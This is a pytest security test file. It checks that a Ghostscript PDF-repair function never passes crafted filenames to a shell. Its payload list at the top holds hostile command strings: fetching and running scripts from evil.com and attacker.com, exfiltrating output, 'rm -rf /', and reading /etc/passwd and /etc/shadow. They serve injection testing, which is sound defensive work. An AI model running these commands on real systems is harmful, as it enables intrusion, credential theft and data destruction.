import pytest
import subprocess
import os
import sys
import tempfile
import shutil
from unittest.mock import patch, MagicMock, call
import importlib

# ---------------------------------------------------------------------------
# Adversarial payloads – shell metacharacters / injection strings
# ---------------------------------------------------------------------------
SHELL_INJECTION_PAYLOADS = [
    "; rm -rf /",
    "$(whoami)",
    "`id`",
    "| cat /etc/passwd",
    "&& curl http://evil.com/shell.sh | bash",
    "; wget http://attacker.com/malware -O /tmp/x && chmod +x /tmp/x && /tmp/x",
    "$(curl http://evil.com/$(whoami))",
    "`touch /tmp/pwned`",
    "'; DROP TABLE users; --",
    "\"; rm -rf / \"",
    "file$(id).txt",
    "file`uname -a`.txt",
    "file;ls -la.txt",
    "file|id.txt",
    "file&&id.txt",
    "file||id.txt",
    "file\nid\n.txt",
    "file\rid.txt",
    "file%0aid.txt",
    "file%0did.txt",
    "../../../etc/passwd",
    "../../etc/shadow",
    "/etc/passwd",
    "file$(cat /etc/passwd).txt",
    "${IFS}cat${IFS}/etc/passwd",
    "file;$(python3 -c 'import os;os.system(\"id\")')",
    "file`python3 -c 'import os;os.system(\"id\")'`",
    "a b c; id",
    "filename with spaces; id",
    "-rf /",
    "--option=value; id",
    "$(echo pwned > /tmp/pwned_test)",
    ">>/tmp/appended",
    "2>/tmp/stderr_redirect",
    "file{.txt,;id}",
    "file$(printf '\\x3bid')",
]


# ---------------------------------------------------------------------------
# Helper: attempt to import the module under test
# ---------------------------------------------------------------------------
def _try_import_file_utils():
    """Try to import the real module; return None if unavailable."""
    try:
        import api.utils.file_utils as fu
        return fu
    except ImportError:
        pass
    try:
        import file_utils as fu
        return fu
    except ImportError:
        pass
    return None


# ---------------------------------------------------------------------------
# Core invariant check helpers
# ---------------------------------------------------------------------------

def _check_subprocess_call_safety_raw(captured_calls, payload):
    """
    Inspect raw captured subprocess.run call tuples and verify:
    1. shell=True is not used with user-controlled input
    2. If shell=True IS used, the payload is not present unescaped
    3. If shell=False (list form), the payload is not split across args
       in a way that injects new commands
    """
    dangerous_chars = [';', '|', '&', '`', '$']

    for args, kwargs in captured_calls:
        shell_used = kwargs.get('shell', False)
        cmd = args[0] if args else kwargs.get('args', [])

        if shell_used:
            # shell=True with user input is inherently dangerous
            cmd_str = cmd if isinstance(cmd, str) else ' '.join(str(a) for a in cmd)
            # The payload must NOT appear verbatim in a shell=True command string
            assert payload not in cmd_str, (
                f"SECURITY VIOLATION: shell=True used and raw payload "
                f"appears in command string.\n"
                f"Payload: {payload!r}\n"
                f"Command: {cmd_str!r}"
            )
            # Also check for dangerous metacharacters from the payload
            for char in dangerous_chars:
                if char in payload:
                    assert char not in cmd_str, (
                        f"SECURITY VIOLATION: shell=True used and metacharacter "
                        f"'{char}' from payload appears in command.\n"
                        f"Payload: {payload!r}\n"
                        f"Command: {cmd_str!r}"
                    )
        else:
            # shell=False (list form) – safer, but verify payload isn't
            # being passed as a single string that could be misused
            if isinstance(cmd, str):
                # A string command without shell=True is unusual but check anyway
                assert payload not in cmd, (
                    f"Raw payload found in subprocess command string "
                    f"(shell=False but string cmd): {cmd!r}"
                )


# ---------------------------------------------------------------------------
# Tests using the real module (skipped if module unavailable)
# ---------------------------------------------------------------------------

class TestRepairPdfWithGhostscriptSecurity:
    """
    Security invariant tests for repair_pdf_with_ghostscript.

    These tests verify that subprocess calls never use shell=True,
    which would allow shell injection via crafted filenames.
    """

    @pytest.fixture(autouse=True)
    def require_module(self):
        """Skip entire class if the module cannot be imported."""
        fu = _try_import_file_utils()
        if fu is None:
            pytest.skip(
                "api.utils.file_utils could not be imported – "
                "full app dependencies required to run this security test."
            )
        self.fu = fu

    def _run_with_mocked_subprocess(self, input_bytes=b"%PDF-1.4 fake"):
        """
        Run repair_pdf_with_ghostscript with subprocess.run and shutil.which
        both mocked. Returns the list of (args, kwargs) tuples captured.

        shutil.which is mocked to return '/usr/bin/gs' so the early-exit
        guard inside repair_pdf_with_ghostscript is bypassed and the
        subprocess call is always reached.
        """
        captured_calls = []

        mock_result = MagicMock()
        mock_result.returncode = 0
        mock_result.stdout = ""
        mock_result.stderr = ""

        def capturing_run(*args, **kwargs):
            captured_calls.append((args, kwargs))
            return mock_result

        # Patch both subprocess.run AND shutil.which so the gs-not-found
        # early return is bypassed even in CI environments without Ghostscript.
        with patch("subprocess.run", side_effect=capturing_run), \
             patch("shutil.which", return_value="/usr/bin/gs"):
            try:
                self.fu.repair_pdf_with_ghostscript(input_bytes)
            except Exception:
                # We only care about what was passed to subprocess, not the
                # overall success of the function.
                pass

        return captured_calls

    def test_shell_false_is_set(self):
        """Verify that shell=False (or absent) for every subprocess call."""
        captured_calls = self._run_with_mocked_subprocess()

        assert captured_calls, (
            "No subprocess.run calls were captured. "
            "Check that shutil.which mock is working and the function "
            "actually reaches the subprocess call."
        )

        for args, kwargs in captured_calls:
            shell_used = kwargs.get("shell", False)
            assert not shell_used, (
                f"SECURITY VIOLATION: shell=True detected in subprocess call.\n"
                f"kwargs: {kwargs!r}"
            )

    @pytest.mark.parametrize("payload", SHELL_INJECTION_PAYLOADS)
    def test_no_shell_injection_via_payload(self, payload):
        """
        Verify that shell metacharacters in a crafted payload do not
        result in shell injection when passed through the subprocess call.
        """
        # Use the payload as fake PDF bytes to simulate a crafted input
        fake_input = payload.encode("utf-8", errors="replace")
        captured_calls = self._run_with_mocked_subprocess(input_bytes=fake_input)

        # Even if no subprocess call was made (e.g. early validation),
        # that is also safe – but we assert calls were made to confirm
        # the mock is working.
        assert captured_calls, (
            "No subprocess.run calls captured – shutil.which mock may not "
            "be reaching the subprocess invocation."
        )

        _check_subprocess_call_safety_raw(captured_calls, payload)


# ---------------------------------------------------------------------------
# Standalone invariant test (parametrized, module-level)
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("payload", SHELL_INJECTION_PAYLOADS)
def test_repair_pdf_shell_injection_invariant(payload):
    """
    Top-level parametrized test: for each adversarial payload, verify
    that repair_pdf_with_ghostscript never invokes subprocess with
    shell=True or with the raw payload in a shell command string.

    Skips (not fails) when the module cannot be imported.
    """
    fu = _try_import_file_utils()
    if fu is None:
        pytest.skip(
            "api.utils.file_utils could not be imported – "
            "full app dependencies required to run this security test."
        )

    captured_calls = []

    mock_result = MagicMock()
    mock_result.returncode = 0
    mock_result.stdout = ""
    mock_result.stderr = ""

    def capturing_run(*args, **kwargs):
        captured_calls.append((args, kwargs))
        return mock_result

    # Mock shutil.which to bypass the gs-not-found early return so the
    # subprocess call is always reached in CI environments without Ghostscript.
    with patch("subprocess.run", side_effect=capturing_run), \
         patch("shutil.which", return_value="/usr/bin/gs"):
        try:
            fu.repair_pdf_with_ghostscript(b"%PDF-1.4 fake content")
        except Exception:
            pass

    assert captured_calls, (
        "No subprocess.run calls captured. "
        "Ensure shutil.which mock bypasses the early-exit guard."
    )

    _check_subprocess_call_safety_raw(captured_calls, payload)


# ---------------------------------------------------------------------------
# Detection-logic self-tests (verify the checker itself works)
# ---------------------------------------------------------------------------

class TestDetectionLogicSelfTest:
    """
    Verify that _check_subprocess_call_safety_raw correctly identifies
    dangerous patterns. These tests use intentionally unsafe patterns
    to confirm the detection logic fires as expected.
    """

    def test_detects_shell_true_with_metacharacter(self):
        """Checker must raise on shell=True with a dangerous payload."""
        payload = "; rm -rf /"
        # Intentionally unsafe pattern used only to test the detector.
        unsafe_cmd = f"gs -dBATCH {payload}"  # nosec B604 – test-only simulation
        captured = [
            (
                (unsafe_cmd,),
                {"shell": True},  # nosec B604 – test-only simulation
            )
        ]
        with pytest.raises(AssertionError, match="SECURITY VIOLATION"):
            _check_subprocess_call_safety_raw(captured, payload)

    def test_allows_shell_false_list_form(self):
        """Checker must not raise when shell=False and cmd is a list."""
        payload = "; rm -rf /"
        safe_cmd = ["gs", "-dBATCH", "-sDEVICE=pdfwrite", "-o", "output.pdf", "input.pdf"]
        captured = [
            (
                (safe_cmd,),
                {"shell": False},
            )
        ]
        # Should not raise
        _check_subprocess_call_safety_raw(captured, payload)

    def test_detects_payload_in_shell_true_string(self):
        """Checker must raise when payload appears verbatim in shell=True cmd."""
        payload = "$(whoami)"
        unsafe_cmd = f"gs -dBATCH {payload} output.pdf"  # nosec B604 – test-only simulation
        captured = [
            (
                (unsafe_cmd,),
                {"shell": True},  # nosec B604 – test-only simulation
            )
        ]
        with pytest.raises(AssertionError, match="SECURITY VIOLATION"):
            _check_subprocess_call_safety_raw(captured, payload)

    def test_allows_empty_captured_calls_check(self):
        """Checker must not raise on empty call list."""
        _check_subprocess_call_safety_raw([], "; rm -rf /")
